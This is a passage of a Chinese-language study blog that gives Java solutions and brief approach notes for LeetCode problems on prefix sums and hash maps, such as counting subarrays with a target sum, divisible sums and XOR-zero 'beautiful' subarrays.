<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] platesBetweenCandles(String s, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span>[] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] leftCandleIndex = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span>[] rightCandleIndex = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">preCandleIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;|&#x27;</span>) &#123;</span><br><span class="line">                preCandleIndex = i;</span><br><span class="line">                preSum[i + <span class="number">1</span>] = preSum[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                preSum[i + <span class="number">1</span>] = preSum[i] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            leftCandleIndex[i] = preCandleIndex;</span><br><span class="line">        &#125;</span><br><span class="line">        preCandleIndex = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;|&#x27;</span>) &#123;</span><br><span class="line">                preCandleIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            rightCandleIndex[i] = preCandleIndex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> queries[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> queries[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!(rightCandleIndex[left] == -<span class="number">1</span> || leftCandleIndex[right] == -<span class="number">1</span> || rightCandleIndex[left] &gt;= right || leftCandleIndex[right] &lt;= left)) &#123;</span><br><span class="line">                res[i] = preSum[leftCandleIndex[right] + <span class="number">1</span>] - preSum[rightCandleIndex[left]]; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1744-你能在你最喜欢的那天吃到你最喜欢的糖果吗？"><a href="#1744-你能在你最喜欢的那天吃到你最喜欢的糖果吗？" class="headerlink" title="1744. 你能在你最喜欢的那天吃到你最喜欢的糖果吗？"></a><a href="https://leetcode.cn/problems/can-you-eat-your-favorite-candy-on-your-favorite-day/">1744. 你能在你最喜欢的那天吃到你最喜欢的糖果吗？</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前缀和</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span>[] canEat(<span class="type">int</span>[] candiesCount, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> candiesCount.length;</span><br><span class="line">        <span class="type">long</span>[] preSum = <span class="keyword">new</span> <span class="title class_">long</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; candiesCount.length; i++) &#123;</span><br><span class="line">            preSum[i + <span class="number">1</span>] = preSum[i] + candiesCount[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        <span class="type">boolean</span>[] res = <span class="keyword">new</span> <span class="title class_">boolean</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">favoriteType</span> <span class="operator">=</span> queries[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">favoriteDay</span> <span class="operator">=</span> queries[i][<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">dailyCap</span> <span class="operator">=</span> queries[i][<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> favoriteDay;<span class="comment">//没管第favoriteDay 天</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">maxVal</span> <span class="operator">=</span> (<span class="type">long</span>) favoriteDay* dailyCap;</span><br><span class="line">            res[i] = minVal &lt; preSum[favoriteType + <span class="number">1</span>] &amp;&amp; maxVal + dailyCap &gt; preSum[favoriteType];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="前缀和与哈希表"><a href="#前缀和与哈希表" class="headerlink" title="前缀和与哈希表"></a>前缀和与哈希表</h2><h3 id="930-和相同的二元子数组"><a href="#930-和相同的二元子数组" class="headerlink" title="930. 和相同的二元子数组"></a><a href="https://leetcode.cn/problems/binary-subarrays-with-sum/">930. 和相同的二元子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">刚看还以为是子序列和为target，还在纳闷为啥分到这个题单。</span><br><span class="line">直接加滑动窗口就行了，但需要考虑到的连续0</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numSubarraysWithSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> goal)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">left2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//left1&lt;=left2&lt; right</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;right&lt;n;right++)&#123;</span><br><span class="line">            sum1 += nums[right];</span><br><span class="line">            sum2 += nums[right];</span><br><span class="line">            <span class="keyword">while</span>(left1&lt;=right&amp;&amp;sum1&gt;goal) sum1-= nums[left1++];</span><br><span class="line">            <span class="keyword">while</span>(left2&lt;=right&amp;&amp;sum2&gt;=goal) sum2-= nums[left2++];</span><br><span class="line">            res += (left2 - left1);</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1524-和为奇数的子数组数目"><a href="#1524-和为奇数的子数组数目" class="headerlink" title="1524. 和为奇数的子数组数目"></a><a href="https://leetcode.cn/problems/number-of-sub-arrays-with-odd-sum/">1524. 和为奇数的子数组数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路前缀和，固定右边，记录左边</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numOfSubarrays</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oddCount</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//奇数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">evenCount</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//偶数</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isCurEven</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">1</span>) isCurEven = !isCurEven;</span><br><span class="line">            <span class="keyword">if</span>(isCurEven)&#123;</span><br><span class="line">                res += oddCount;</span><br><span class="line">                evenCount++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res += <span class="number">1</span>;</span><br><span class="line">                res += evenCount;</span><br><span class="line">                oddCount++;</span><br><span class="line">            &#125;</span><br><span class="line">            res %= MOD_NUM;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="974-和可被-K-整除的子数组"><a href="#974-和可被-K-整除的子数组" class="headerlink" title="974. 和可被 K 整除的子数组"></a><a href="https://leetcode.cn/problems/subarray-sums-divisible-by-k/">974. 和可被 K 整除的子数组</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subarraysDivByK</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">sumMod</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            sumMod += num;</span><br><span class="line">            sumMod %= k;</span><br><span class="line">            sumMod = sumMod &lt; <span class="number">0</span> ? sumMod + k : sumMod;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> map.getOrDefault(sumMod, <span class="number">0</span>);</span><br><span class="line">            res += count;</span><br><span class="line">            map.put(sumMod, count + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="523-连续的子数组和"><a href="#523-连续的子数组和" class="headerlink" title="523. 连续的子数组和"></a><a href="https://leetcode.cn/problems/continuous-subarray-sum/">523. 连续的子数组和</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkSubarraySum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        preSum %= k;</span><br><span class="line">        set.add(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (set.contains((preSum + nums[i]) % k)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            set.add(preSum);</span><br><span class="line">            preSum += nums[i];</span><br><span class="line">            preSum %= k;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2588-统计美丽子数组数目"><a href="#2588-统计美丽子数组数目" class="headerlink" title="2588. 统计美丽子数组数目"></a><a href="https://leetcode.cn/problems/count-the-number-of-beautiful-subarrays/">2588. 统计美丽子数组数目</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个下标从 0 开始的整数数组nums 。每次操作中，你可以：</span><br><span class="line"></span><br><span class="line">选择两个满足 0 &lt;= i, j &lt; nums.length 的不同下标 i 和 j 。</span><br><span class="line">选择一个非负整数 k ，满足 nums[i] 和 nums[j] 在二进制下的第 k 位（下标编号从 0 开始）是 1 。</span><br><span class="line">将 nums[i] 和 nums[j] 都减去 2^k 。</span><br><span class="line">如果一个子数组内执行上述操作若干次后，该子数组可以变成一个全为 0 的数组，那么我们称它是一个 美丽 的子数组。</span><br><span class="line"></span><br><span class="line">请你返回数组 nums 中 美丽子数组 的数目。</span><br><span class="line"></span><br><span class="line">子数组是一个数组中一段连续 非空 的元素序列。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">光看题干感觉是困难题，没啥思路啊。但是是中等题目，并且连续子数组。(破案了 2^k 吞成2k了)</span><br><span class="line">看看怎样往前缀和上面凑了。</span><br><span class="line">不会，想不出来看题解了。。。。。。。。。。</span><br></pre></td></tr></table></figure>

<p>题解学习</p>
<p><a href="https://leetcode.cn/problems/count-the-number-of-beautiful-subarrays/solutions/2163133/tao-lu-qian-zhui-he-ha-xi-biao-pythonjav-3fna/">2588. 统计美丽子数组数目 - 力扣（LeetCode）</a></p>
<p>由于 1⊕1&#x3D;0，把所有比特位合起来看，美丽子数组这等价于子数组的异或结果等于 0。</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">beautifulSubarrays</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//子数组长度至少为2</span></span><br><span class="line">        map.put(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">xorSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            xorSum ^= nums[i];</span><br><span class="line">            res += map.getOrDefault(xorSum, <span class="number">0</span>);</span><br><span class="line">            map.merge(xorSum, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="525-连续数组"><a href="#525-连续数组" class="headerlink" title="525. 连续数组"></a><a href="https://leetcode.cn/problems/contiguous-array/">525. 连续数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">相同的为1就加1，为零就减少1.</span><br><span class="line">前缀和</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMaxLength</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            preSum += (nums[i] == <span class="number">1</span> ? <span class="number">1</span> : -<span class="number">1</span>); </span><br><span class="line">            res = Integer.max(res,i - map.getOrDefault(preSum, Integer.MAX_VALUE));</span><br><span class="line">            map.merge(preSum, i, Integer::min);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3026-最大好子数组和"><a href="#3026-最大好子数组和" class="headerlink" title="3026. 最大好子数组和"></a><a href="https://leetcode.cn/problems/maximum-good-subarray-sum/">3026. 最大好子数组和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前缀和变式，看看咋操作</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maximumSubarraySum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Long&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> Long.MIN_VALUE;</span><br><span class="line">        <span class="type">long</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(num - k)) &#123;</span><br><span class="line">                res = Long.max(res, preSum + num - map.get(num - k));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(num + k)) &#123;</span><br><span class="line">                res = Long.max(res, preSum + num - map.get(num + k));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//确保放的是当前数字前面的和（不包含当前数字）</span></span><br><span class="line">            map.merge(num, preSum, Long::min);</span><br><span class="line">            preSum += num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == Long.MIN_VALUE ? <span class="number">0</span> : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1546-和为目标值且不重叠的非空子数组的最大数目"><a href="#1546-和为目标值且不重叠的非空子数组的最大数目" class="headerlink" title="1546. 和为目标值且不重叠的非空子数组的最大数目"></a><a href="https://leetcode.cn/problems/maximum-number-of-non-overlapping-subarrays-with-sum-equals-target/">1546. 和为目标值且不重叠的非空子数组的最大数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">贪心加前缀和</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxNonOverlapping</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n) &#123;</span><br><span class="line">            Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            set.add(<span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n) &#123;</span><br><span class="line">                preSum += nums[right++];</span><br><span class="line">                <span class="keyword">if</span> (set.contains(preSum - target)) &#123;</span><br><span class="line">                    res++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                set.add(preSum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="面试题-17-05-字母与数字"><a href="#面试题-17-05-字母与数字" class="headerlink" title="面试题 17.05. 字母与数字"></a><a href="https://leetcode.cn/problems/find-longest-subarray-lcci/">面试题 17.05. 字母与数字</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前缀和，为数字加一，字母减一。记录长度和起始端点</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String[] findLongestSubarray(String[] array) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();<span class="comment">//左边总值，右边后面坐标</span></span><br><span class="line">        map.put(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (array[i].charAt(<span class="number">0</span>) &lt;= <span class="string">&#x27;9&#x27;</span> &amp;&amp; array[i].charAt(<span class="number">0</span>) &gt;= <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                preSum++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                preSum--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//又满足条件的</span></span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(preSum)) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">curRes</span> <span class="operator">=</span> i - map.get(preSum) + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (curRes &gt; maxLength) &#123;</span><br><span class="line">                    maxLength = curRes;</span><br><span class="line">                    leftIndex = map.get(preSum);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            map.merge(preSum, i + <span class="number">1</span>, Integer::min);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (leftIndex == -<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;&#125;;</span><br><span class="line">        <span class="keyword">return</span> Arrays.copyOfRange(array, leftIndex, leftIndex + maxLength);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1124-表现良好的最长时间段"><a href="#1124-表现良好的最长时间段" class="headerlink" title="1124. 表现良好的最长时间段"></a><a href="https://leetcode.cn/problems/longest-well-performing-interval/">1124. 表现良好的最长时间段</a></h3><p>todo：之后学单调栈，在写下单调栈写法</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestWPI</span><span class="params">(<span class="type">int</span>[] hours)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> hours.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum += hours[i] &gt; <span class="number">8</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                res = i + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">preIndex</span> <span class="operator">=</span> map.getOrDefault(sum - <span class="number">1</span>, Integer.MAX_VALUE);</span><br><span class="line">                res = Integer.max(res, i - preIndex);</span><br><span class="line">            &#125;</span><br><span class="line">            map.merge(sum, i, Integer::min);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2488-统计中位数为-K-的子数组"><a href="#2488-统计中位数为-K-的子数组" class="headerlink" title="2488. 统计中位数为 K 的子数组"></a><a href="https://leetcode.cn/problems/count-subarrays-with-median-k/">2488. 统计中位数为 K 的子数组</a></h3><p>todo</p>
<h3 id="1590-使数组和能被-P-整除"><a href="#1590-使数组和能被-P-整除" class="headerlink" title="1590. 使数组和能被 P 整除"></a><a href="https://leetcode.cn/problems/make-sum-divisible-by-p/">1590. 使数组和能被 P 整除</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubarray</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> p)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> Arrays.stream(nums).asLongStream().sum();</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> (<span class="type">int</span>) (sum % p);</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();<span class="comment">//左边值，右边index+1</span></span><br><span class="line">        map.put(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            preSum += nums[i];</span><br><span class="line">            preSum %= p;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mapKey</span> <span class="operator">=</span> ((preSum - target) % p);</span><br><span class="line">            <span class="keyword">if</span> (mapKey &lt; <span class="number">0</span>) mapKey += p;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(mapKey)) &#123;</span><br><span class="line">                res = Integer.min(res, i - map.get(mapKey) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(preSum, i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == nums.length ? -<span class="number">1</span> : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



